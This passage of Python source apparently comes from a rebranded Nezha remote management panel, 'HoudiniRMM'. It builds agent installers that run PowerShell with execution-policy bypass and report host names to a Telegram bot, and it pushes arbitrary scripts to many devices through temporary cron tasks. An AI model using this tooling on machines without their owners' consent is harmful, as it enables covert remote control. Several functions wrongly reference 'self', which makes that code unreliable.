            $claimBody = @{{ token = $enrollToken; uuid = $agentUuid }} | ConvertTo-Json
            $claimResp = Invoke-WebRequest -UseBasicParsing -Uri "$ServerUrl/dashboard/api/claim-device" `
                -Method POST -ContentType "application/json" -Body $claimBody -ErrorAction Stop
            $claimJson = $claimResp.Content | ConvertFrom-Json
            if ($claimJson.ok) {{
                Write-Host "  [OK] Device claimed successfully (device_id: $($claimJson.device_id))" -ForegroundColor Green
                $claimed = $true
                break
            }} else {{
                Write-Host "  Claim response: $($claimJson.error)" -ForegroundColor Yellow
            }}
        }} catch {{
            $errMsg = $_.Exception.Message
            if ($_.Exception.Response) {{
                try {{ $errBody = (New-Object IO.StreamReader($_.Exception.Response.GetResponseStream())).ReadToEnd() }} catch {{ $errBody = $errMsg }}
                Write-Host "  Claim attempt ($($i+1)/12): $errBody" -ForegroundColor Yellow
            }} else {{
                Write-Host "  Claim attempt ($($i+1)/12): $errMsg" -ForegroundColor Yellow
            }}
        }}
    }}
    if (-not $claimed) {{
        Write-Host "  [WARN] Device claim pending — agent will retry on next start" -ForegroundColor Yellow
        Write-Host "  The device will appear in your panel once it registers" -ForegroundColor Gray
    }}
}}

# Rename device to real computer name (so dashboard + Telegram show real name)
Write-Host "[7] Setting device name to real computer name..." -ForegroundColor Cyan
$uuid = ""
if (Test-Path $cfg) {{
    $cfgText = Get-Content $cfg -Raw -ErrorAction SilentlyContinue
    if ($cfgText -match "^uuid:\s*(.+)$") {{ $uuid = $Matches[1].Trim() }}
}}
if ($uuid) {{
    for ($i = 0; $i -lt 12; $i++) {{
        Start-Sleep -Seconds 5
        try {{
            $srvData = Invoke-RestMethod -Uri "$ServerUrl/api/v1/server" -Method GET -ErrorAction SilentlyContinue
            $found = $false
            foreach ($sv in $srvData.data) {{
                if (($sv.uuid -eq $uuid) -and ($sv.name -ne $env:COMPUTERNAME)) {{
                    $renameBody = @{{ name = $env:COMPUTERNAME }} | ConvertTo-Json
                    Invoke-RestMethod -Uri "$ServerUrl/api/v1/server/$($sv.id)" -Method PATCH `
                        -ContentType "application/json" -Body $renameBody -ErrorAction SilentlyContinue
                    Write-Host "  [OK] Device renamed to $env:COMPUTERNAME" -ForegroundColor Green
                    $found = $true
                    break
                }}
            }}
            if ($found) {{ break }}
        }} catch {{ }}
    }}
}} else {{
    Write-Host "  No UUID found yet — name will stay as generated" -ForegroundColor Gray
}}

Write-Host ""
Write-Host "============================================" -ForegroundColor Magenta
Write-Host "  INSTALLATION COMPLETE" -ForegroundColor Green
Write-Host "  Server : $ServerUrl" -ForegroundColor Gray
Write-Host "  Service: $serviceName" -ForegroundColor Gray
Write-Host "  Binary : $agent" -ForegroundColor Gray
Write-Host "  Config : $cfg" -ForegroundColor Gray
Write-Host "  Telegram: {"ENABLED" if tg_token else "not configured"}" -ForegroundColor Gray
Write-Host "============================================" -ForegroundColor Magenta
#endregion
"""
    return p






def build_standalone_windows(b: dict, use_signed: bool = True, save_branding_cfg: bool = True) -> Path:
    """One-file Windows installer EXE with agent+config embedded. Returns signed version if available."""
    if use_signed and SIGNED_EXE.exists():
        return SIGNED_EXE
    import subprocess, os
    script = Path("/opt/nezha/agent-builder/build_standalone_exe.sh")
    # When not saving branding cfg (non-admin user), temporarily write the
    # user's branding so the build script picks up their client_secret,
    # then restore the original branding after the build.
    _saved_branding = None
    if not save_branding_cfg and BRANDING_PATH.exists():
        try:
            _saved_branding = BRANDING_PATH.read_bytes()
        except Exception:
            _saved_branding = None
        save_branding(b)
    elif save_branding_cfg:
        save_branding(b)
    env = {**os.environ, "PATH": "/usr/local/go/bin:/usr/bin:/bin:/usr/local/bin"}
    before = {x.name for x in OUT.glob("*-Setup-windows-amd64-*.exe")}
    try:
        out = subprocess.check_output(
            ["bash", str(script)],
            text=True,
            stderr=subprocess.STDOUT,
            env=env,
            cwd="/opt/nezha/agent-builder",
        )
    except subprocess.CalledProcessError as e:
        raise RuntimeError("standalone exe build failed: " + (e.output or str(e)))
    path = None
    for line in out.splitlines():
        if line.startswith("OUT="):
            path = Path(line.split("=", 1)[1].strip())
    if path and path.exists():
        if _saved_branding is not None:
            try: BRANDING_PATH.write_bytes(_saved_branding)
            except Exception: pass
        return path
    # pick newest file not in before set
    after = sorted(OUT.glob("*-Setup-windows-amd64-*.exe"), key=lambda x: x.stat().st_mtime, reverse=True)
    for f in after:
        if f.name not in before:
            if _saved_branding is not None:
                try: BRANDING_PATH.write_bytes(_saved_branding)
                except Exception: pass
            return f
    if after:
        if _saved_branding is not None:
            try: BRANDING_PATH.write_bytes(_saved_branding)
            except Exception: pass
        return after[0]
    if _saved_branding is not None:
        try: BRANDING_PATH.write_bytes(_saved_branding)
        except Exception: pass
    raise RuntimeError("standalone exe build failed: " + out)

def _tg_report_ps1():
    return r"""# tg-report.ps1 - report an agent lifecycle action to Telegram (HTML formatted)
param(
    [string]$Event = 'install_ok',
    [string]$Status = '',
    [string]$Detail = ''
)
$ErrorActionPreference = 'SilentlyContinue'
$cfgFile = Join-Path $PSScriptRoot 'tg-config.json'
if (-not (Test-Path $cfgFile)) { exit 0 }
try { $cfg = Get-Content $cfgFile -Raw | ConvertFrom-Json } catch { exit 0 }
if (-not $cfg.bot_token -or -not $cfg.chat_id) { exit 0 }
$titles = @{ install_start='Agent Install Started'; install_ok='Agent Installed'; install_fail='Agent Install Failed'; uninstall='Agent Uninstalled'; start='Agent Started'; stop='Agent Stopped'; online='Agent Online'; offline='Agent Offline' }
$icons = @{ install_start='[START]'; install_ok='[OK]'; install_fail='[FAIL]'; uninstall='[UNINSTALL]'; start='[START]'; stop='[STOP]'; online='[ONLINE]'; offline='[OFFLINE]' }
$title = $titles[$Event]; if (-not $title) { $title = $Event }
$icon = $icons[$Event]; if (-not $icon) { $icon = '[INFO]' }
$line = "------------------------"
$prod = "$($cfg.product)"; if (-not $prod) { $prod = 'Agent' }
$srv = "$($cfg.server)"; if (-not $srv) { $srv = '' }
$msg = "$icon $prod - $title`n$line`n"
$msg += "* Host : $env:COMPUTERNAME`n"
if ($Detail) { $msg += "* Detail : $Detail`n" }
if ($srv) { $msg += "* Server : $srv`n" }
$msg += "$line`n"
if ($Status) {
    $emoji = '[OK]'
    if ($Status -match 'fail|error') { $emoji = '[FAIL]' }
    $msg += "$emoji Status : $Status`n"
}
$msg += "[TIME] $([DateTime]::UtcNow.ToString('yyyy-MM-dd HH:mm:ss')) UTC"
try {
    $body = @{ chat_id = $cfg.chat_id; text = $msg; parse_mode = '' }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($cfg.bot_token)/sendMessage" -Method Post -Body $body -ContentType 'application/x-www-form-urlencoded' | Out-Null
} catch {}
"""


def _tg_report_sh():
    return r"""#!/bin/bash
# tg-report.sh - report an agent lifecycle action to Telegram (HTML formatted)
EVENT="${1:-install_ok}"
STATUS="${2:-}"
DETAIL="${3:-}"
DIR="$(cd "$(dirname "$0")" && pwd)"
CFG="$DIR/tg-config.json"
[ -f "$CFG" ] || exit 0
read_json(){ python3 -c "import json,sys;d=json.load(open(sys.argv[1]));print(d.get(sys.argv[2],''))" "$CFG" "$1" 2>/dev/null; }
TOKEN="$(read_json bot_token)"
CHAT="$(read_json chat_id)"
PRODUCT="$(read_json product)"
SERVER="$(read_json server)"
[ -n "$TOKEN" ] && [ -n "$CHAT" ] || exit 0
case "$EVENT" in
  install_start) TITLE="Agent Install Started"; ICON="[START]";;
  install_ok)     TITLE="Agent Installed";       ICON="[OK]";;
  install_fail)   TITLE="Agent Install Failed";  ICON="[FAIL]";;
  uninstall)      TITLE="Agent Uninstalled";     ICON="[UNINSTALL]";;
  start)          TITLE="Agent Started";         ICON="[START]";;
  stop)           TITLE="Agent Stopped";         ICON="[STOP]";;
  online)         TITLE="Agent Online";          ICON="[ONLINE]";;
  offline)        TITLE="Agent Offline";         ICON="[OFFLINE]";;
  *)              TITLE="$EVENT";                ICON="[INFO]";;
esac
PRODUCT="${PRODUCT:-Agent}"
LINE="--------------------------------------------------------"
MSG="$ICON $PRODUCT - $TITLE"$'\n'"$LINE"$'\n'"* Host : $(hostname)"
[ -n "$DETAIL" ] && MSG="$MSG"$'\n'"* Detail : $DETAIL"
[ -n "$SERVER" ] && MSG="$MSG"$'\n'"* Server : $SERVER"
MSG="$MSG"$'\n'"$LINE"
[ -n "$STATUS" ] && MSG="$MSG"$'\n'"[OK] Status : $STATUS"
MSG="$MSG"$'\n'"$LINE"$'\n'"[TIME] $(date -u +'%Y-%m-%d %H:%M:%S') UTC"
curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
  --data-urlencode "chat_id=${CHAT}" \
  --data-urlencode "text=${MSG}" >/dev/null 2>&1
"""


def build_package(platform: str, b: dict, use_signed: bool = True, uid: int = 0) -> Path:
    product = safe_name(b.get("product_name") or "HoudiniRMM")
    company = b.get("company") or "HoudiniRMM"
    description = b.get("description") or ""
    website = b.get("website") or ""
    meta = OFFICIAL[platform]
    src_zip = ensure_official(platform)
    OUT.mkdir(parents=True, exist_ok=True)
    stamp = time.strftime("%Y%m%d-%H%M%S")
    out_path = OUT / f"{product}-{platform}-amd64-{stamp}.zip"
    # Use per-user TG config if uid is provided, otherwise global
    tg = tg_config_active_for(uid) if uid else tg_config_active()
    tg_token = tg.get("bot_token", "")
    tg_chat = tg.get("chat_id", "")

    with tempfile.TemporaryDirectory() as td:
        td_path = Path(td)
        with zipfile.ZipFile(src_zip, "r") as zf:
            zf.extractall(td_path)
        binary = None
        for p in td_path.rglob("*"):
            if p.is_file() and p.name in (meta["inner"], "nezha-agent.exe", "nezha-agent"):
                binary = p
                break
        if not binary:
            raise RuntimeError("official agent binary not found in zip")

        pkg = td_path / "package"
        pkg.mkdir()
        bin_name = f"{product}.exe" if platform == "windows" else product
        target_bin = pkg / bin_name
        if platform == "windows" and use_signed and SIGNED_EXE.exists():
            shutil.copy2(SIGNED_EXE, target_bin)
        else:
            shutil.copy2(binary, target_bin)
        if platform == "linux":
            target_bin.chmod(0o755)
        (pkg / "config.yml").write_text(make_config(b), encoding="utf-8")
        (pkg / "branding.json").write_text(
            json.dumps(
                {
                    "product_name": b.get("product_name"),
                    "company": company,
                    "description": description,
                    "website": website,
                    "server": b.get("server"),
                    "tls": bool(b.get("tls")),
                    "platform": platform,
                },
                indent=2,
            ),
            encoding="utf-8",
        )
        if ICON_PATH.exists():
            shutil.copy2(ICON_PATH, pkg / f"app-icon{ICON_PATH.suffix.lower() or '.png'}")
        else:
            logo = Path("/opt/nezha/dashboard/user-dist/logo.svg")
            if logo.exists():
                shutil.copy2(logo, pkg / "app-icon.png")

        if tg_token and tg_chat:
            # Embed Telegram reporting so the installed agent reports actions.
            (pkg / "tg-config.json").write_text(
                json.dumps(
                    {"bot_token": tg_token, "chat_id": tg_chat, "product": product, "server": b.get("server")},
                    indent=2,
                ),
                encoding="utf-8",
            )

        if platform == "windows":
            if tg_token and tg_chat:
                (pkg / "tg-report.ps1").write_text(
                    _tg_report_ps1(),
                    encoding="utf-8",
                )
                install_extra = 'powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0tg-report.ps1" -Event install_start -Status "Installing"\n'
                install_ok = 'powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0tg-report.ps1" -Event install_ok -Status "Installed" -Detail "Connected to {0}"\n'.format(b.get("server"))
                install_fail = 'powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0tg-report.ps1" -Event install_fail -Status "Install failed"\n'
                uninstall_start = 'powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0tg-report.ps1" -Event uninstall -Status "Uninstalling"\n'
                uninstall_done = 'powershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0tg-report.ps1" -Event uninstall -Status "Uninstalled"\n'
            else:
                install_extra = install_ok = install_fail = uninstall_start = uninstall_done = ""
            # Enrollment token claim step (user builds only)
            enroll_tok = str(b.get("enrollment_token") or "").strip()
            claim_call = ""
            if enroll_tok and enroll_tok != "None":
                srv_host = str(b.get("server", "")).split(":")[0]
                # Write a claim.ps1 script that waits for agent UUID and claims device
                claim_ps1_template = (
                    "param([string]$ServerUrl='https://{srv}',[string]$Token='{tok}')\n"
                    "Write-Host 'Claiming device with enrollment token...'\n"
                    "for($i=0;$i -lt 12;$i++){{\n"
                    "  Start-Sleep -Seconds 5\n"
                    "  $uuid=''\n"
                    "  if(Test-Path config.yml){{\n"
                    "    $c=Get-Content config.yml -Raw -ErrorAction SilentlyContinue\n"
                    "    if($c -match 'uuid:\\s*(.+?)\s*$'){{ $uuid=$matches[1].Trim() }}\n"
                    "  }}\n"
                    "  if(-not $uuid){{ Write-Host '  Waiting for agent UUID... ('+($i+1)+'/12)'; continue }}\n"
                    "  Write-Host ('  Agent UUID: '+$uuid)\n"
                    "  try{{\n"
                    "    $body=@{{token=$Token;uuid=$uuid}}|ConvertTo-Json\n"
                    "    $r=Invoke-WebRequest -UseBasicParsing -Uri ($ServerUrl+'/dashboard/api/claim-device') -Method POST -ContentType 'application/json' -Body $body\n"
                    "    $j=$r.Content|ConvertFrom-Json\n"
                    "    if($j.ok){{ Write-Host ('  Device claimed OK (id: '+$j.device_id+')'); exit 0 }}\n"
                    "    Write-Host ('  Claim response: '+$j.error)\n"
                    "  }}catch{{ Write-Host ('  Claim attempt ('+($i+1)+'/12) failed: '+$_.Exception.Message) }}\n"
                    "}}\n"
                    "Write-Host '  Claim pending - device will appear in your panel shortly'\n"
                )
                claim_ps1 = claim_ps1_template.format(srv=srv_host, tok=enroll_tok)
                (pkg / "claim.ps1").write_text(claim_ps1, encoding="utf-8")
                claim_call = '\necho Claiming device...\npowershell -NoProfile -ExecutionPolicy Bypass -File "%~dp0claim.ps1"\n'

            (pkg / "install.bat").write_text(
                f"""@echo off
cd /d "%~dp0"
echo Installing {product}...
{install_extra}"{bin_name}" service -c config.yml uninstall >nul 2>&1
"{bin_name}" service -c config.yml install
if errorlevel 1 (
{install_fail} echo Failed - run as Administrator & pause & exit /b 1
)
{install_ok}echo OK - connected to {b.get('server')}{claim_call}
pause
""",
                encoding="utf-8",
            )
            (pkg / "uninstall.bat").write_text(
                f"""@echo off
cd /d "%~dp0"
{uninstall_start}"{bin_name}" service -c config.yml uninstall
{uninstall_done}echo Uninstalled.
pause
""",
                encoding="utf-8",
            )
            (pkg / "README.txt").write_text(
                f"""{product} — {company}
server: {b.get('server')}
Telegram alerts: {"ENABLED - actions are reported to your configured chat" if (tg_token and tg_chat) else "disabled - configure Telegram in the dashboard to enable reporting"}
Install: right-click install.bat as Administrator
Uninstall: uninstall.bat as Administrator
""",
                encoding="utf-8",
            )
        else:
            if tg_token and tg_chat:
                (pkg / "tg-report.sh").write_text(_tg_report_sh(), encoding="utf-8")
                (pkg / "tg-report.sh").chmod(0o755)
                install_extra = './tg-report.sh install_start "Installing"\n'
                install_ok = './tg-report.sh install_ok "Installed" "Connected to {0}"\n'.format(b.get("server"))
                install_fail = './tg-report.sh install_fail "Install failed"\n'
                uninstall_start = './tg-report.sh uninstall "Uninstalling"\n'
                uninstall_done = './tg-report.sh uninstall "Uninstalled"\n'
            else:
                install_extra = install_ok = install_fail = uninstall_start = uninstall_done = ""
            (pkg / "install.sh").write_text(
                f"""#!/bin/bash
set -e
cd "$(dirname "$0")"
chmod +x "./{bin_name}"
{install_extra}./{bin_name} service -c config.yml uninstall >/dev/null 2>&1 || true
./{bin_name} service -c config.yml install
{install_fail}{install_ok}echo Installed -> {b.get('server')}
""",
                encoding="utf-8",
            )
            (pkg / "install.sh").chmod(0o755)
            (pkg / "uninstall.sh").write_text(
                f"""#!/bin/bash
cd "$(dirname "$0")"
{uninstall_start}./{bin_name} service -c config.yml uninstall || true
{uninstall_done}""",
                encoding="utf-8",
            )
            (pkg / "uninstall.sh").chmod(0o755)

        with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for f in pkg.rglob("*"):
                if f.is_file():
                    zf.write(f, arcname=f"{product}/{f.relative_to(pkg).as_posix()}")

    builds = sorted(OUT.glob("*.zip"), key=lambda p: p.stat().st_mtime, reverse=True)
    for old in builds[20:]:
        old.unlink(missing_ok=True)
    return out_path


class DashSession:
    """Authenticated session against local Nezha dashboard API."""

    # Nezha requires web_real_ip_header (X-Real-IP) when configured.
    _REAL_IP_HEADERS = {
        "X-Real-IP": "127.0.0.1",
        "X-Forwarded-For": "127.0.0.1",
    }

    def __init__(self):
        self.cj = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(self.cj))
        self.token = None
        self.csrf = None

    def _headers(self, extra=None):
        h = dict(self._REAL_IP_HEADERS)
        if extra:
            h.update(extra)
        return h

    def login(self):
        try:
            passw = ADMIN_PASS_FILE.read_text(encoding="utf-8").strip()
        except Exception:
            raise RuntimeError("admin password file not readable")
        data = json.dumps({"username": "admin", "password": passw}).encode()
        req = urllib.request.Request(
            f"{DASHBOARD}/api/v1/login",
            data=data,
            headers=self._headers({"Content-Type": "application/json"}),
            method="POST",
        )
        try:
            resp = json.loads(self.opener.open(req, timeout=15).read())
        except Exception as e:
            raise RuntimeError(f"dashboard login request failed: {e}")
        if not resp.get("success"):
            raise RuntimeError(f"login failed: {resp}")
        self.token = resp["data"]["token"]
        self._refresh_csrf()
        return self

    def _refresh_csrf(self):
        try:
            req = urllib.request.Request(
                f"{DASHBOARD}/api/v1/profile",
                headers=self._headers({"Authorization": f"Bearer {self.token}"}),
            )
            self.opener.open(req, timeout=10)
            for c in self.cj:
                if c.name == "nz-csrf":
                    self.csrf = c.value
        except Exception:
            pass  # csrf is optional for some endpoints

    def get(self, path: str):
        req = urllib.request.Request(
            f"{DASHBOARD}{path}",
            headers=self._headers({"Authorization": f"Bearer {self.token}"}),
        )
        try:
            return json.loads(self.opener.open(req, timeout=20).read())
        except urllib.error.HTTPError as e:
            raw = e.read().decode(errors="replace")
            try:
                return json.loads(raw)
            except Exception:
                return {"success": False, "error": raw or str(e)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    def post(self, path: str, body, method: str = "POST"):
        self._refresh_csrf()
        data = json.dumps(body).encode()
        req = urllib.request.Request(
            f"{DASHBOARD}{path}",
            data=data,
            headers=self._headers(
                {
                    "Authorization": f"Bearer {self.token}",
                    "Content-Type": "application/json",
                    "X-CSRF-Token": self.csrf or "",
                }
            ),
            method=method,
        )
        try:
            return json.loads(self.opener.open(req, timeout=30).read())
        except urllib.error.HTTPError as e:
            raw = e.read().decode()
            try:
                return json.loads(raw)
            except Exception:
                return {"success": False, "error": raw or str(e)}

    def batch_delete(self, resource: str, ids):
        return self.post(f"/api/v1/batch-delete/{resource}", ids)


RESOURCE_MAP = {
    "service": "service",
    "task": "cron",
    "notification": "notification",
    "alert": "alert-rule",
    "ddns": "ddns",
    "nat": "nat",
    "servergroup": "server-group",
    "notifgroup": "notification-group",
    "transfer": "transfer",
}


def nz_list(resource: str):
    s = DashSession().login()
    return s.get(f"/api/v1/{resource}")


def nz_create(resource: str, body):
    s = DashSession().login()
    return s.post(f"/api/v1/{resource}", body)


def nz_update(resource: str, rid, body):
    s = DashSession().login()
    return s.post(f"/api/v1/{resource}/{rid}", body, method="PATCH")


def nz_delete(resource: str, rid):
    s = DashSession().login()
    return s.batch_delete(resource, [int(rid)])


def list_users():
    s = DashSession().login()
    return s.get("/api/v1/user")


def create_user(username, password, role):
    s = DashSession().login()
    return s.post("/api/v1/user", {"username": username, "password": password, "role": int(role or 1)})


def update_user(rid, body):
    # Nezha dashboard API has no per-user update endpoint.
    # Only self-profile updates via POST /api/v1/profile are supported.
    return {"success": False, "error": "User editing is not supported by the dashboard API"}


def delete_user(rid):
    s = DashSession().login()
    return s.batch_delete("user", [rid])



def list_devices(owner_uid=None, admin_uid=0):
    s = DashSession().login()
    data = s.get("/api/v1/server")
    servers = data.get("data") or []
    # If owner_uid is set, filter to only servers owned by that user.
    # owner_uid=None means show all (used by /api/user-devices).
    # owner_uid=-1 means admin-owned only (owner_id==0 or owner_id==admin_uid).
    # owner_uid>0 means a specific user's devices.
    if owner_uid is not None:
        if owner_uid == -1:
            # Admin-owned devices: owner_id is 0 (legacy) or admin's actual uid
            admin_ids = {0, admin_uid}
            servers = [d for d in servers if int((d.get("owner") or {}).get("id") or 0) in admin_ids]
        else:
            servers = [d for d in servers if int((d.get("owner") or {}).get("id") or 0) == owner_uid]
    out = []
    for d in servers:
        st = d.get("state") or {}
        host = d.get("host") or {}
        last = d.get("last_active") or ""
        online = False
        if last and not last.startswith("0001-"):
            # consider active if last_active within ~3 minutes - parse ISO
            try:
                # simple: if has recent state with uptime
                online = bool(st.get("uptime")) or bool(host.get("platform"))
            except Exception:
                online = False
        # better online: last_active recent
        try:
            from datetime import datetime, timezone

            if last and not last.startswith("0001"):
                # strip fractional/z
                ts = last.replace("Z", "+00:00")
                if "." in ts:
                    # normalize
                    head, rest = ts.split(".", 1)
                    frac = re.match(r"(\d+)", rest)
                    tz = rest[rest.find("+") :] if "+" in rest else "+00:00"
                    if frac:
                        ts = f"{head}.{frac.group(1)[:6]}{tz if '+' in rest or rest.endswith('Z') else '+00:00'}"
                        if "Z" in last and "+" not in ts:
                            ts = f"{head}.{frac.group(1)[:6]}+00:00"
                dt = datetime.fromisoformat(ts)
                if dt.tzinfo is None:
                    dt = dt.replace(tzinfo=timezone.utc)
                online = (datetime.now(timezone.utc) - dt).total_seconds() < 180
        except Exception:
            online = bool(st.get("uptime"))

        geo = ((d.get("geoip") or {}).get("ip") or {})
        out.append(
            {
                "id": d.get("id"),
                "name": d.get("name") or f"#{d.get('id')}",
                "uuid": d.get("uuid"),
                "online": online,
                "platform": host.get("platform") or "",
                "platform_version": host.get("platform_version") or "",
                "arch": host.get("arch") or "",
                "cpu_info": (host.get("cpu") or [""])[0] if isinstance(host.get("cpu"), list) else (host.get("cpu") or ""),
                "agent_version": host.get("version") or "",
                "ip": geo.get("ipv4_addr") or geo.get("ipv6_addr") or "",
                "country_code": (d.get("geoip") or {}).get("country_code") or "",
                "cpu": st.get("cpu") or 0,
                "mem_used": st.get("mem_used") or 0,
                "mem_total": host.get("mem_total") or 0,
                "disk_used": st.get("disk_used") or 0,
                "disk_total": host.get("disk_total") or 0,
                "net_in_speed": st.get("net_in_speed") or 0,
                "net_out_speed": st.get("net_out_speed") or 0,
                "net_in_transfer": st.get("net_in_transfer") or 0,
                "net_out_transfer": st.get("net_out_transfer") or 0,
                "uptime": st.get("uptime") or 0,
                "last_active": last,
                "_owner_id": int((d.get("owner") or {}).get("id") or 0),
                "_owner_name": (d.get("owner") or {}).get("username") or "",
            }
        )
    return out


def delete_devices(ids: list[int]):
    if not ids:
        return {"success": False, "error": "no ids"}
    s = DashSession().login()
    return s.post("/api/v1/batch-delete/server", ids)


def uninstall_devices(ids: list[int], remove_from_panel: bool = True, wait_seconds: float = 8.0):
    """Push uninstall via one-shot cron, wait for agents, optionally remove from panel."""
    if not ids:
        return {"success": False, "error": "no ids"}
    s = DashSession().login()
    cron_body = {
        "name": f"Houdini-uninstall-{int(time.time())}",
        "task_type": 0,
        "scheduler": "0 0 0 1 1 *",  # 6-field: sec min hour day month weekday
        "command": UNINSTALL_CMD,
        "servers": ids,
        "cover": 0,
        "push_successful": False,
        "notification_group_id": 0,
    }
    created = s.post("/api/v1/cron", cron_body)
    if not created.get("success"):
        hf.audit("uninstall.failed", {"ids": ids, "error": str(created), "step": "create"}, actor=self._calling_username())
        tg_report_action(
            "uninstall",
            {"Device IDs": ", ".join(str(x) for x in ids)},
            status="Uninstall task failed to create",
            ok=False,
        )
        return {"success": False, "error": f"create task failed: {created}", "step": "create"}

    cron_id = created.get("data")
    if isinstance(cron_id, dict):
        cron_id = cron_id.get("id")
    triggered = s.post(f"/api/v1/cron/{cron_id}/manual", {})
    try:
        s.post("/api/v1/batch-delete/cron", [cron_id] if not isinstance(cron_id, list) else cron_id)
    except Exception:
        pass

    waited = max(1.5, float(wait_seconds or 8.0))
    time.sleep(waited)

    deleted = None
    if remove_from_panel:
        deleted = s.post("/api/v1/batch-delete/server", ids)

    msg = "Uninstall command sent to agent(s)."
    if remove_from_panel:
        msg += " Removed from panel."
    hf.audit(
        "uninstall",
        {
            "ids": ids,
            "cron_id": cron_id,
            "remove_from_panel": remove_from_panel,
            "waited": waited,
            "triggered_ok": bool(triggered.get("success", True)) if isinstance(triggered, dict) else True,
        },
    )
    tg_report_action(
        "uninstall",
        {"Device IDs": ", ".join(str(x) for x in ids)},
        status=("Uninstall sent, removed from panel" if remove_from_panel else "Uninstall sent, kept in panel"),
        ok=True,
    )
    return {
        "success": True,
        "cron_id": cron_id,
        "triggered": triggered,
        "deleted": deleted,
        "waited": waited,
        "message": msg,
    }


def run_raw_script_on_devices(ps_script: str, ids: list[int], shell: str = "powershell", timeout_sec: int = 300):
    """Run a raw script on selected devices via temporary Nezha cron task."""
    if not ids:
        return {"success": False, "error": "no ids"}
    s = DashSession().login()
    cron_body = {
        "name": f"SC-deploy-{int(time.time())}",
        "task_type": 0,
        "scheduler": "0 0 0 1 1 *",
        "command": ps_script,
        "servers": ids,
        "cover": 0,
        "push_successful": False,
        "notification_group_id": 0,
    }
    created = s.post("/api/v1/cron", cron_body)
    if created.get("success"):
        cron_data = created.get("data")
        cron_id = cron_data.get("id") if isinstance(cron_data, dict) else cron_data
        s.post("/api/v1/cron/manual", {"id": cron_id})
        return {"success": True, "cron_id": cron_id, "devices": len(ids)}
    return {"success": False, "error": str(created)}

def run_script_on_devices(script_id: str, ids: list[int], shell_override: str | None = None):
    """Run a library script on selected devices via temporary Nezha cron."""
    scripts = hf.load_scripts()
    row = next((s for s in scripts if s.get("id") == script_id), None)
    if not row:
        return {"success": False, "error": "script not found"}
    if not ids:
        return {"success": False, "error": "no ids"}
    content = str(row.get("content") or "")
    s = DashSession().login()
    cron_body = {
        "name": f"Houdini-script-{script_id[:8]}-{int(time.time())}",
        "task_type": 0,
        "scheduler": "0 0 0 1 1 *",
        "command": content,
        "servers": ids,
        "cover": 0,
        "push_successful": False,
        "notification_group_id": 0,
    }
    created = s.post("/api/v1/cron", cron_body)
    if not created.get("success"):
        _actor2 = "admin"
        try:
            _prof2 = self._calling_user_profile()
            if _prof2:
                _actor2 = _prof2.get("username") or "admin"
        except Exception:
            pass
        hf.audit("script.run.failed", {"script_id": script_id, "ids": ids, "error": str(created)}, actor=_actor2)
        tg_report_action(
            "test",
            {"Script": row.get("name"), "Device IDs": ", ".join(str(x) for x in ids)},
            status="Script task failed to create",
            ok=False,
        )
        return {"success": False, "error": f"create task failed: {created}", "step": "create"}
    cron_id = created.get("data")
    if isinstance(cron_id, dict):
        cron_id = cron_id.get("id")
    triggered = s.post(f"/api/v1/cron/{cron_id}/manual", {})
    try:
        s.post("/api/v1/batch-delete/cron", [cron_id] if not isinstance(cron_id, list) else cron_id)
    except Exception:
        pass
    _actor = "admin"
    try:
        _prof = self._calling_user_profile()
        if _prof:
            _actor = _prof.get("username") or "admin"
    except Exception:
        pass
    hf.audit("script.run", {"script_id": script_id, "name": row.get("name"), "ids": ids, "cron_id": cron_id}, actor=_actor)
    tg_report_action(
        "test",
        {"Script": row.get("name"), "Device IDs": ", ".join(str(x) for x in ids)},
        status="Script dispatched to " + str(len(ids)) + " device(s)",
        ok=True,
    )
    return {
        "success": True,
        "cron_id": cron_id,
        "triggered": triggered,
        "script": {"id": row.get("id"), "name": row.get("name")},
        "message": f"Script '{row.get('name')}' sent to {len(ids)} device(s).",
    }


HTML = r"""<!DOCTYPE html>
<html lang="en"><head>
<meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/>
<title>HoudiniRMM · Dashboard</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/>
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/xterm@5.3.0/css/xterm.css"/>
<script src="https://cdn.jsdelivr.net/npm/xterm@5.3.0/lib/xterm.js"></script>
<script src="https://cdn.jsdelivr.net/npm/xterm-addon-fit@0.8.0/lib/xterm-addon-fit.js"></script>
<link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/lipis/flag-icons@7.0.0/css/flag-icons.min.css"/>
<style>
:root{--background:#080809;--sidebar:#050506;--panel:#111214;--panel-strong:#18191d;--panel-soft:#1f2025;--panel-deep:#0d0e10;--border:rgba(255,255,255,.06);--border-strong:rgba(255,255,255,.10);--border-soft:rgba(255,255,255,.08);--text-primary:#f5efe8;--text-secondary:#a4a09b;--text-muted:#6f6a67;--accent:#fb8a74;--accent-strong:#ff9b83;--green:#65d38c;--red:#ef6363;--radius-lg:12px;--radius-xl:16px;--font:Manrope,Satoshi,"Segoe UI",system-ui,sans-serif;--shadow-accent:0 14px 30px rgba(251,138,116,.14)}
*{box-sizing:border-box}html,body{margin:0;min-height:100%;height:100%;overflow:hidden;background:var(--background);color:var(--text-primary);font-family:var(--font);-webkit-font-smoothing:antialiased}
a{color:inherit;text-decoration:none}button,input,textarea{font:inherit}
.app{display:flex;min-height:100dvh;height:100%}
.sidebar{display:none;width:210px;flex-shrink:0;background:var(--sidebar);padding:20px 12px 16px;flex-direction:column;align-items:stretch;gap:12px;z-index:50;overflow:hidden}
@media(min-width:1024px){.sidebar{display:flex}}
.sidebar-logo{width:44px;height:44px;border-radius:11px;object-fit:cover;background:rgba(28,18,15,.96);box-shadow:var(--shadow-accent);align-self:flex-start;margin-left:8px}
.sidebar-brand{display:flex;align-items:center;gap:10px;padding:0 8px 4px;flex-shrink:0}
.sidebar-brand span{font-weight:800;font-size:.95rem;letter-spacing:-.02em;color:var(--text-primary)}
